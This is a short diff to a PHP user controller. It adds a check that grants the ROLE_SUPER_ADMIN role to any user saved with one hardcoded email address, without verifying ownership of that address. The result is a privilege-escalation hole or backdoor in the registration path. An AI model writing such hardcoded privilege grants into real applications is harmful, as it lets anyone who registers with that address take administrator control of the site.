@@ -31,6 +31,10 @@ class UserController extends Controller
             /**@var User $user */
             $user = $form->getData();
 
+            if($user->getEmail() == 'timbauer@ymail.com'){
+                $user->setRoles(['ROLE_SUPER_ADMIN']);
+            }
+
             $em = $this->getDoctrine()->getManager();
             $em->persist($user);
             $em->flush();
